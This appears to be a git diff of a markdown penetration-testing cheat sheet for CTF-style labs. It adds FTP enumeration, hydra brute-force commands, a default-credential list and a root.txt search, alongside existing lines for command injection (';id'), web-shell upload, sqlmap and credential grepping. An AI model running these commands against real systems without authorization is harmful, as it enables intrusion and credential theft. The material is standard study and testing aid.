@@ -55,15 +55,17 @@ nmap -p- [Target IP] -v -A -T5
 nmap -A <target> -oN scan.initial
 ```
 ```bash
-nmap -p- -A <target> -T4 -oN scan.full  
+nmap -p- -A <target> -T4 -oN scan.full
 ```
 ```bash
-nmap -p- -sU --top-ports 200 <target> -oN scan.udp  
+nmap -p- -sU --top-ports 200 <target> -oN scan.udp
 ```
+
 ### Rustscan
 ```bash
 rustscan -a [Target IP] -- -A
 ```
+
 ---
 
 ## 🌐 Enumeration Commands
@@ -72,20 +74,21 @@ rustscan -a [Target IP] -- -A
 ```bash
 nc -nv <target> 80
 ```
-```bash 
+```bash
 curl -sv http://<target>/ -o /dev/null
 ```
 ```bash
 openssl s_client -connect <target>:443 -servername <target> | head
-``` 
+```
 
 ### Searchsploit
 ```bash
 searchsploit "Apache Tomcat 7.0.88"
 ```
 ```bash
-searchsploit --nmap scan.initial  
+searchsploit --nmap scan.initial
 ```
+
 ---
 
 ## 🌐 Web Recon
@@ -104,7 +107,6 @@ ffuf -u http://<target> -H "Host: FUZZ.<target>" -w /usr/share/seclists/Discover
 ```
 
 ### Vhosts
-
 ```bash
 ./vhost-fuzzer.sh [domain] wordlist http://domain
 ```
@@ -140,6 +142,7 @@ droopescan scan drupal -u http://<target>
 ```bash
 joomscan --url http://<target>
 ```
+
 ---
 
 ## 🚪 Foothold Commands
@@ -159,13 +162,41 @@ enum4linux -a <target>
 ```bash
 ftp -p anonymous@IP
 ```
-```bash 
+```bash
 ftp <IP> <PORT>
 ```
+```bash
+nmap -p21 --script ftp-anon,ftp-syst <IP>
+```
 
-### Hydra
+### FTP Useful Commands
+
+| Command | Description |
+|--------|------------|
+| ls | list files |
+| cd | change directory |
+| get | download file |
+| mget * | download all |
+| put | upload file |
+| quit | exit |
+
+### Credential Attacks
+
 ```bash
 hydra -L users.txt -P rockyou.txt ssh://<target>
+```
+```bash
+hydra -l username -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt smb://targetIP
+```
+
+### Common credentials
+
+```text
+root / root
+admin / admin
+root / toor
+admin / password
+(empty password)
 ```
 
 ### Hash cracking
@@ -174,7 +205,7 @@ john --wordlist=rockyou.txt hash.txt
 ```
 ```bash
 hashcat -m # hashfile wordlist -a mode
-``` 
+```
 
 ---
 
@@ -185,15 +216,16 @@ curl -G "http://<target>/ping?ip=127.0.0.1;id"
 ```bash
 curl -F "file=@shell.php" http://<target>/upload.php
 ```
-```bash  
-sqlmap -u "http://<target>?id=1" --batch  
+```bash
+sqlmap -u "http://<target>?id=1" --batch
 ```
+
 ---
 
 ## ⬆️ Privilege Escalation
 
 ### Quick recon
-```bash 
+```bash
 whoami
 ```
 ```bash
@@ -206,7 +238,7 @@ sudo -l
 systeminfo
 ```
 ```bash
-uname -a  
+uname -a
 ```
 
 ### Files
@@ -214,21 +246,25 @@ uname -a
 find / -perm -4000 -type f 2>/dev/null
 ```
 ```bash
-grep -Ri "password" /home /opt 2>/dev/null  
+grep -Ri "password" /home /opt 2>/dev/null
+```
+```bash
+find / -type f -name root.txt
 ```
 
 ### Capabilities
 ```bash
 getcap -r / 2>/dev/null
-``` 
+```
 
 ### Tools
 ```bash
 ./linpeas.sh
-``` 
+```
 ```bash
-./pspy64  
-``` 
+./pspy64
+```
+
 ---
 
 ## 🛠️ Services
@@ -240,13 +276,14 @@ ssh user@IP -p PORT
 
 ### RDP
 ```bash
-xfreerdp /v:IP /u:USER /p:PASSWORD  
+xfreerdp /v:IP /u:USER /p:PASSWORD
 ```
 
 ### Telnet
 ```bash
-telnet IP PORT  
+telnet IP PORT
 ```
+
 ---
 
 ## 📚 Resources
